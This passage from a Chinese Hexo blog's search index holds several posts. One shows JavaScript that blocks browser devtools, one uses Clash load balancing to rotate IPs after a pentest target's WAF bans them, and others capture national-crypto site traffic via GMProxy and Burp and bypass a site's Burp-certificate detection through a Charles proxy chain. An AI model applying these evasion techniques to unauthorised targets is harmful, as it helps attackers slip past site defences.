class="keyword">default</span> is <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>onlypost</strong></p><ul><li>true：只有路由页面或者文章的图片才会被懒加载。</li><li>false：除了站点背景图（如果有的话），整个站点的图片均会被懒加载。</li></ul><p><strong>loadingImg</strong>：指定的话，加载自定义路径的图片用作文章图片加载时显示，不指定的话显示默认图片。</p><p><strong>isSPA</strong></p><ul><li>true：针对单页面应用，当滚动条滚动到图片位置时就会向后端请求图片</li><li>false：刷新才能请求图片</li></ul><p><strong>preloadRatio</strong>：在多少倍的可见区域时触发图片请求，默认为1，即当前屏幕的区域。</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 懒加载 </tag>
            
            <tag> 博客优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo禁用调试模式</title>
      <link href="/2024/04/09/Hexo%E7%A6%81%E7%94%A8%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/"/>
      <url>/2024/04/09/Hexo%E7%A6%81%E7%94%A8%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>网站禁用调试模式是一种常见的网站安全措施，旨在防止攻击者利用浏览器开发工具（如Chrome DevTools）对网站进行恶意攻击或窃取敏感信息。禁用调试模式通过限制或禁止开发工具的使用，增强网站的安全防护。</p><p>实现网站禁用调试模式的技术方法有多种。一种常见的方法是在网页代码中插入JavaScript代码来检测是否打开了开发工具。如果检测到开发工具被打开，则会禁用页面的一些功能，或将页面重定向到其他页面。这种方法的实现相对简单，但也存在一定的被绕过风险。</p><p>另一种更为安全的方法是使用服务器端的技术来检测是否打开了开发工具。服务器端可以检测客户端请求头中的User-Agent字段，以识别浏览器和开发工具的类型。如果检测到请求头中包含开发工具的信息，服务器端可以采取相应的措施来禁止对网站进行攻击。</p><p>本文主要介绍通过网站中引入JavaScript代码，禁止攻击者打开DEvtools实现。</p><h1 id="0x01-实现步骤"><a href="#0x01-实现步骤" class="headerlink" title="0x01 实现步骤"></a>0x01 实现步骤</h1><h2 id="新建bandev-js文件"><a href="#新建bandev-js文件" class="headerlink" title="新建bandev.js文件"></a>新建bandev.js文件</h2><p>在theme对应主题下的新建  source&#x2F;js&#x2F;bandev.js（自行修改提示文字）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁止右键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;event.returnValue=false;&quot;</span>) <span class="comment">//禁用右键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听按键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f12</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;F12被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+shift+i</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">shiftKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+shift+i被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+s</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">83</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+s被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// ctrl+p</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+p被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁止先打开控制台然后强行进入</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 这里我做的是跳转首页，可以根据实际需要进行其他限制</span></span><br><span class="line">    <span class="keyword">var</span> domain = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>;<span class="comment">// 获取当前域名</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://&quot;</span> + domain;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要分为三个方面的思路：</p><p>1、禁止右键</p><p>2、禁止特定按键</p><p>3、禁止先打开控制台后强制进入</p><p>下面具体说明这三个的实现方法：</p><h2 id="禁止右键"><a href="#禁止右键" class="headerlink" title="禁止右键"></a>禁止右键</h2><p>1、最简单的一行代码搞定：document.oncontextmenu是一个事件处理器，它会在用户尝试在文档上执行右键点击（即打开上下文菜单）时被触发，调用函数，将event.returnValue设置为false默认阻止此事件的发生。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.oncontextmenu = new Function(&quot;event.returnValue=false;&quot;) //禁用右键</span><br></pre></td></tr></table></figure><p>2、但需要注意，上面的代码适用于旧的浏览器（如IE）版本，在更现代的浏览器（如Chrome, Firefox等）中，这种方式可能不会起作用。对于更现代的浏览器，通常会使用event.preventDefault()方法来阻止默认行为。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.oncontextmenu = function(event) &#123;  </span><br><span class="line">    event.preventDefault();  </span><br><span class="line">    return false;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="禁止特定按键"><a href="#禁止特定按键" class="headerlink" title="禁止特定按键"></a>禁止特定按键</h2><p>防止F12和shift+ctrl+i调起开发者工具；并且禁用ctrl+s和ctrl+s，防止对网页内容本地保存</p><p>监听按键事件，对上述的按件进行监听，如果监听到设置event.returnValue &#x3D; false。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 监听按键</span><br><span class="line">document.onkeydown = function () &#123;</span><br><span class="line">    // f12</span><br><span class="line">    if (window.event &amp;&amp; window.event.keyCode == 123) &#123;</span><br><span class="line">        alert(&quot;F12被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ctrl+shift+i</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.shiftKey &amp;&amp; window.event.keyCode == 73) &#123;</span><br><span class="line">        alert(&quot;ctrl+shift+i被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ctrl+s</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.keyCode == 83) &#123;</span><br><span class="line">        alert(&quot;ctrl+s被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">     // ctrl+p</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.keyCode == 80) &#123;</span><br><span class="line">        alert(&quot;ctrl+p被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="禁止先打开控制台后强制进入"><a href="#禁止先打开控制台后强制进入" class="headerlink" title="禁止先打开控制台后强制进入"></a>禁止先打开控制台后强制进入</h2><p>如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//禁止先打开控制台然后强行进入</span><br><span class="line">function a() &#123;</span><br><span class="line">    var domain = window.location.host;// 获取当前域名</span><br><span class="line">    window.location.href = &quot;https://&quot; + domain;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">if (window.outerHeight - window.innerHeight &gt; 150) &#123;</span><br><span class="line">    a()</span><br><span class="line">&#125;</span><br><span class="line">if (window.outerWidth - window.innerWidth &gt; 150) &#123;</span><br><span class="line">    a()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁止右键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;  </span><br><span class="line">    event.<span class="title function_">preventDefault</span>();  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听按键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f12</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+shift+i</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">shiftKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">73</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+s</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">83</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// ctrl+p</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁止先打开控制台然后强行进入</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请关闭控制台后再访问本站！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> domain = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>;<span class="comment">// 获取当前域名</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://&quot;</span> + domain;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hexo一键三连后，查看效果</p><p>执行效果如下：</p><ul><li>右键、特定按键打开Devtools，无反应</li><li>先打开控制台后强制进入，会弹窗，强制关闭devtools</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091645594.png" alt="image-20240409164540557">  </p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客安全 </tag>
            
            <tag> 禁用调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clash配置负载均衡</title>
      <link href="/2024/04/08/clash%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>/2024/04/08/clash%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在使用Clash节点的时候，有时候觉得自己的节点网速跑不满，速度不够快。这时候，我们可以尝试着使用负载均衡，来让节点的网速拉满。在渗透测试的时候，目标站点那边有WAF，操作没几分钟就被客户把IP ban掉了，如果使用clash挂上游代理，可以切换IP，但每次被封一个就切换一次，太麻烦，这块就可以使用负载均衡的方式，一个IP被ban后，直接自动切换下一个IP。。。</p><h2 id="0x01-准备材料"><a href="#0x01-准备材料" class="headerlink" title="0x01 准备材料"></a>0x01 准备材料</h2><ul><li>Clash 节点配置</li><li>基于原版 Clash、Clash Premium 或 Clash Meta 的客户端</li></ul><h2 id="0x02-配置步骤"><a href="#0x02-配置步骤" class="headerlink" title="0x02 配置步骤"></a>0x02 配置步骤</h2><h3 id="CFW-Parsers"><a href="#CFW-Parsers" class="headerlink" title="CFW Parsers"></a>CFW Parsers</h3><ol><li>打开 Clash For Windows，转到“设置”→“配置”。点击“预处理配置”右边的“Edit”按钮：</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023662.png" alt="image-20240410102323613">  </p><ol start="2"><li>在内置编辑器中，粘贴以下内容并保存</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parsers:</span><br><span class="line">  - reg: &#x27;slbable$&#x27;</span><br><span class="line">    yaml:</span><br><span class="line">      append-proxy-groups:</span><br><span class="line">        - name: ⚖️ 负载均衡-散列</span><br><span class="line">          type: load-balance</span><br><span class="line">          url: &#x27;http://www.google.com/generate_204&#x27;</span><br><span class="line">          interval: 300</span><br><span class="line">          strategy: consistent-hashing</span><br><span class="line">        - name: ⚖️ 负载均衡-轮询</span><br><span class="line">          type: load-balance</span><br><span class="line">          url: &#x27;http://www.google.com/generate_204&#x27;</span><br><span class="line">          interval: 300</span><br><span class="line">          strategy: round-robin</span><br><span class="line">      commands:</span><br><span class="line">        - proxy-groups.⚖️ 负载均衡-散列.proxies=[]proxyNames</span><br><span class="line">        - proxy-groups.0.proxies.0+⚖️ 负载均衡-散列</span><br><span class="line">        - proxy-groups.⚖️ 负载均衡-轮询.proxies=[]proxyNames</span><br><span class="line">        - proxy-groups.0.proxies.0+⚖️ 负载均衡-轮询</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023242.png" alt="image-20240410102331198">  </p><ol start="3"><li>为了防止正常订阅被污染，请自行修改订阅地址，在其后面加上#slbable即可使用负载均衡</li></ol><p>在订阅地址后面手动输入：#slbable</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023573.png" alt="image-20240410102338531">  </p><ol start="4"><li>点击确定回到【配置】界面，右击配置项选择【预处理配置】。如果出现如下界面，就代表负载均衡规则已加载成功：</li></ol><p>出现 reg(slbable$) 代表负载均衡规则加载成功</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023311.png" alt="image-20240410102344268">  </p><ol start="5"><li>此时，Clash 已经配置好的节点之间的负载均衡规则。在【代理】-【规则】中出现了【负载均衡-散列】和【负载均衡-轮询】的选项：</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023529.png" alt="image-20240410102350484">  </p><p>新增的<strong>【负载均衡-散列】</strong>和<strong>【负载均衡-轮询】</strong>选项卡</p><p>在只需要重启 Clash 并选择好代理，就可以实现负载均衡效果。</p><ol start="6"><li>重启之后，打开【代理】-【规则】，并点击选择【负载均衡-轮询模式】。然后右击窗口右下角的Clash小蓝猫图标，像右侧图片这样选择。选择【系统代理】、然后代理模式选择【规则】。</li></ol><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>关于<strong>系统代理</strong>、<strong>TUN模式</strong>、<strong>混合配置</strong>这些，新手可以这么理解：</p><ul><li>系统代理：就是浏览页面、看视频之类的走代理（魔法上网）。游戏、应用之类的不会走代理</li><li>TUN 模式：就是无论网页、游戏、应用还是什么全部按照规则走代理（魔法上网）。</li><li>混合模式：就是上面两个混一起用。</li></ul><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>使用Python脚本来简单测试一下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span>,</span><br><span class="line">           <span class="string">&#x27;https&#x27;</span>: <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">ips = []</span><br><span class="line"><span class="comment"># IP正则表达式，用于提前返回字符串中的IP</span></span><br><span class="line">regex_str = <span class="string">r&quot;\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    response = requests.get(<span class="string">&quot;https://ipinfo.io&quot;</span>, proxies=proxies)</span><br><span class="line">    ip = re.findall(regex_str, response.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> ips:</span><br><span class="line">        ips.append(ip)</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023915.png" alt="image-20240410102358873">  </p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次国密站点抓包流程</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>目标站点：针对国密站点，此处举例某金融国密站点</p><p>使用工具：GMproxy、burp</p><p>说明：使用GMproxy和burp联动，抓取国密站点的数据包</p><h2 id="0x01-GMproxy说明与使用"><a href="#0x01-GMproxy说明与使用" class="headerlink" title="0x01 GMproxy说明与使用"></a>0x01 GMproxy说明与使用</h2><h3 id="1-说明"><a href="#1-说明" class="headerlink" title="1. 说明"></a>1. 说明</h3><p>为保障重要系统的安全，国家密码管理局要求相应业务系统要做广泛的改造，改用中国标准的公钥密码算法。国密算法的支持已成为业务系统的重要安全保障。</p><p>但随着国密网站的增多，包括很多单位的办公SSL VPN也逐步改造为国密SSL VPN。很多常用浏览器不支持国密SSL网站访问的问题日益突出，如Chrome 、Edge、IE、FireFox火狐 等浏览器均不能访问国密SSL网站。</p><p>“GMProxy”正是来<strong>让任意浏览器支持国密网站的工具</strong>。GMProxy 为绿色软件，下载后解压即可使用。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029361.png" alt="image-20240410102900222">  </p><h3 id="2-软件下载"><a href="#2-软件下载" class="headerlink" title="2. 软件下载"></a>2. 软件下载</h3><p>最新版的GMProxy：<a href="https://www.gmproxy.cn/GMProxy.msi">https://www.gmproxy.cn/GMProxy.msi</a></p><p>软件签名信息为: <strong>北京水熊虫网络科技有限公司</strong>。</p><p>GMProxy.msi SHA1:0b163a967b96a212a16b74083faf78963b35f375</p><h3 id="3-安装证书"><a href="#3-安装证书" class="headerlink" title="3. 安装证书"></a>3. 安装证书</h3><p>帮助–&gt;安装跟证书，安装到 “受信任的根证书安装机构”下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029845.png" alt="image-20240410102913811"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029510.png" alt="image-20240410102919468">  </p><h3 id="4-运行"><a href="#4-运行" class="headerlink" title="4. 运行"></a>4. 运行</h3><p>直接下载后之后，桌面运行快捷方式即可打开：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029502.png" alt="image-20240410102925460"> </p><h3 id="5-编辑网址列表"><a href="#5-编辑网址列表" class="headerlink" title="5. 编辑网址列表"></a>5. 编辑网址列表</h3><p>只有在国密网址列表中的URL 才会启动国密SSL 转换，无论访问HTTP 还是HTTPS ，GMProxy 都会转换成国密https进行访问。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029472.png" alt="image-20240410102931437"> </p><h3 id="6-备注"><a href="#6-备注" class="headerlink" title="6. 备注"></a>6. 备注</h3><p>这个工具使用有时间限制，会涉及到软件激活：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029406.png" alt="image-20240410102935364"> </p><h2 id="0x02-普通浏览器访问国密站点"><a href="#0x02-普通浏览器访问国密站点" class="headerlink" title="0x02 普通浏览器访问国密站点"></a>0x02 普通浏览器访问国密站点</h2><p>“GMProxy”正是来<strong>让任意浏览器支持国密网站的工具</strong>。</p><p>1、当我们不使用GMProxy的时候，使用chrome浏览器，会提示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029449.png" alt="image-20240410102941397"> </p><p>2、使用GMProxy来访问国密站点</p><p>（1）首先，在浏览器上设置代理，将流量转发到GMProxy（GMProxy默认端口<strong>18080</strong>）</p><p><img src="C:/Users/HONOR/AppData/Roaming/Typora/typora-user-images/image-20240410102946428.png" alt="image-20240410102946428"> </p><p>（2）开启代理，重新访问国密站点，访问成功 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029426.png" alt="image-20240410102953367"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029629.png" alt="image-20240410102958572"> </p><h2 id="0x03-burp联动GMProxy"><a href="#0x03-burp联动GMProxy" class="headerlink" title="0x03 burp联动GMProxy"></a>0x03 burp联动GMProxy</h2><p>1、可以通过给BurpSuite 设置<strong>Upstream</strong> 代理 ，实现对国密HTTPS的测试</p><p>（这块将 burp抓到的流量转发到GMProxy）</p><p>User OPtions –&gt; UpStream proxy</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030083.png" alt="image-20240410103003046"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030235.png" alt="image-20240410103009205"> </p><p>2、浏览器正常开启burp代理</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030629.png" alt="image-20240410103015597"> </p><p>3、成功抓取到国密站点流量，并可以正常访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030545.png" alt="image-20240410103026503"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030816.png" alt="image-20240410103031752"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> burp </tag>
            
            <tag> 国密站点 </tag>
            
            <tag> GMproxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次web站点检测burp证书抓包</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1web%E7%AB%99%E7%82%B9%E6%A3%80%E6%B5%8Bburp%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1web%E7%AB%99%E7%82%B9%E6%A3%80%E6%B5%8Bburp%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>目标站点：某期货公司web站点</p><p>工具：charles、burp</p><p>说明：web站点开启burp后不能访问，但使用Charle抓包正常。</p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>1、访问目标地址：可以正常访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028089.png" alt="image-20240410102802034">  </p><p>2、开启burp抓包，发现不能成功访问了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028969.png" alt="image-20240410102807932"> </p><p>3、但是使用charles进行抓包，可以成功抓包并访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028019.png" alt="image-20240410102813961"> </p><p>4、所以，猜测当前站点<strong>有对burp证书进行检测</strong>。</p><h2 id="0x02-解决办法"><a href="#0x02-解决办法" class="headerlink" title="0x02 解决办法"></a>0x02 解决办法</h2><p>双层代理屏蔽掉burp证书，让流量从 <strong>浏览器 –&gt; burp –&gt;Charles</strong>：</p><p>1、首先，在burp上配置上游代理，让burp的流量转发到Charles：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028423.png" alt="image-20240410102820377"></p><p>2、浏览器上正常开启burp代理</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028074.png" alt="image-20240410102826031"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028705.png" alt="image-20240410102834676"></p><p>3、打开Charles，Charles默认监听8888端口：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028678.png" alt="image-20240410102840645"> </p><p>4、重新访问地址，可以成功访问并抓包：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028384.png" alt="image-20240410102847329">  </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次VPN不走全局代理抓包解决办法</title>
